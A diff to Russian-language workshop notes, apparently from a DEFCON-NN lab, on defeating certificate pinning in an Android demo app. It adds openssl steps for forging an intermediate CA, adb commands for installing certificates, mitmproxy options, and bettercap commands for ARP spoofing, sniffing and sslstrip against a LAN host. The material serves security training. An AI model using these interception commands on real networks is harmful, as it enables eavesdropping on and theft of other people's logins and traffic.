@@ -120,6 +120,13 @@ bettercap --full-duplex --proxy-https -T 192.168.1.102
 v2. Устанавливаем вторую версию приложения:
 adb install -r pinsubj-2.apk
 
+Запускаем - ошибка (no trust root).
+Нужно установить корневой сертификат DC7831.
+Конвертируем pem в crt: (pem можно извлечь из chain.pem -- либо мне нужно выложить его отдельно..)
+openssl x509 -outform der -in ca-dc7831.pem -out ca-dc7831.crt
+adb push ca-dc7831.crt /sdcard/mitm/ca-dc7831.crt, затем устанавливаем через settings
+Приложение начинает работать.
+
 Запускаем bettercap с дефолтным CA: видим ошибку.
 CA не установлено в системе... Давайте установим его
 
@@ -131,7 +138,7 @@ adb push bettercap-ca.crt /sdcard/bc.crt
 Сделаем обход этого слабого пиннинга.
 Возьмем bettercap-ca.pem, разделим ключ и сертификат в папке demoCA/cacert.pem и demoCA/private/cakey.pem
 Далее запрос /usr/lib/ssl/misc/CA.pl -newreq, заполняем поля Subject так, как в Intermediate Certificate с сайта mitm.defcon-nn.ru (смотрим в браузере).
-Далее правим /etc/ssl/openssl.cnf, заменяем CA:FALSE на CA:TRUE в sign-атрибутах.. Далее CA.p -sign (чтобы сработал, нужно пустой index.txt и непустой serial)
+Далее правим /etc/ssl/openssl.cnf, заменяем CA:FALSE на CA:TRUE в sign-атрибутах (не забываем убрать X509v3 Key Usage: Digital Signature, Non Repudiation, Key Encipherment - интермедиэйт не получится иначе). Далее CA.p -sign (чтобы сработал, нужно пустой index.txt, index.txt.attr и непустой serial (F474EEBF3FB9D586 - такого вида число нужно); и директории все лучше создать - newcerts, crl, certs)
 
 bettercap не умеет делать cert chain'ы на своих прокси -- поэтому нам нужен более продвинутый внешний прокси. К счастью, есть mitmproxy.
 
@@ -145,6 +152,10 @@ bettercap -X --full-duplex --custom-https-proxy 192.168.1.161 --custom-https-pro
 mitmproxy -T --host --cert *=./xxxall.pem --insecure 
 
 (insecure - т.к. у нас DC7831 CA не trusted, то mitmproxy это видит и дропает...)
+
+Для mitmproxy 4.x:
+
+mitmproxy --mode transparent ...
 
 ==>> Login Successful!
 
@@ -189,3 +200,25 @@ adb push ca-dc7831.crt /sdcard
 Settings->Security->...
 
 
+====
+
+Установка Bettercap2:
+- Скачать zip-архив
+- Проверить sha256sum
+- Распаковать
+- Установить  apt-get install libpcap-dev libnetfilter-queue-dev -- это только если libpcap 1.0+ (0.8 не катит)
+
+Установка из сорцов:
+apt-get install golang
+mkdir -p ~/go/src
+go get github.com/bettercap/bettercap
+(запускать ~/go/bin/bettercap)
+Для обновления: go get -u ...
+
+
+Команды:
+set arp.spoof.targets 192.168.1.102
+arp.spoof on
+net.sniff on
+set http.proxy.sslstrip true
+http.proxy on
